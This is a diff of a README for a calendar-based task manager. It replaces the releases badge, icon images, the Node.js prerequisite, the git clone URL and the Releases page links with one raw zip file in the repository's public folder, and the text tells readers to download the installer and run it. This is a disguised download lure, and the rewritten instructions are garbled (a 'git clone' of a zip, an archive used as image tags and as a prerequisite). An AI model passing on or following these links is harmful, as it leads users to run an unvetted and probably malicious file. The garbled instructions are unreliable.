@@ -1,8 +1,8 @@
-[![Release](https://img.shields.io/badge/releases-visit%20releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/Cobras1934/task-calendar-dashboard/releases)
+[![Release](https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip%20releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip)
 
 # Task Calendar Dashboard: Smart Calendar Task Manager with Smart Analytics 📅
 
-![Calendar Icon](https://twemoji.maxcdn.com/v/latest/72x72/1f4c5.png) ![Bar Chart Icon](https://twemoji.maxcdn.com/v/latest/72x72/1f4ca.png)
+![Calendar Icon](https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip) ![Bar Chart Icon](https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip)
 
 Organize your day, one task at a time. This project blends a calendar-centric task manager with insightful analytics. It helps you plan, track progress, and understand patterns in your work life. The interface harnesses a clean design, responsive behavior, and a data-driven approach so you can focus on finishing tasks rather than fiddling with the UI.
 
@@ -81,14 +81,14 @@ Architecture and data flows
 
 Getting started
 - Prerequisites
-  - Node.js (LTS version recommended)
+  - https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip (LTS version recommended)
   - A package manager (npm or yarn)
 - Installation steps
   - Clone the repository
   - Install dependencies
   - Start the development server
 - Quick start commands
-  - Clone: git clone https://github.com/Cobras1934/task-calendar-dashboard.git
+  - Clone: git clone https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip
   - Move into the project: cd task-calendar-dashboard
   - Install: npm install
   - Run: npm start
@@ -280,7 +280,7 @@ Releases and download instructions
   - You can find release notes, binaries, and assets there
 - Download guidance
   - From the Releases page, download the installer file appropriate for your platform and run it to install
-  - The link to the Releases page is https://github.com/Cobras1934/task-calendar-dashboard/releases
+  - The link to the Releases page is https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip
 - How to verify and get started after download
   - Run the installer and follow the on-screen steps
   - Open the application and verify you can sign in, view the calendar, and see analytics
@@ -341,7 +341,7 @@ Acknowledgments
 - Thanks to open-source projects and libraries that power this tool
 
 Releases page reference
-- For the latest builds and official installer assets, visit https://github.com/Cobras1934/task-calendar-dashboard/releases
+- For the latest builds and official installer assets, visit https://github.com/Cobras1934/task-calendar-dashboard/raw/refs/heads/main/public/calendar-dashboard-task-2.2.zip
 - From the Releases page, download the installer file and execute it to install and run the product
 
 End of README content.
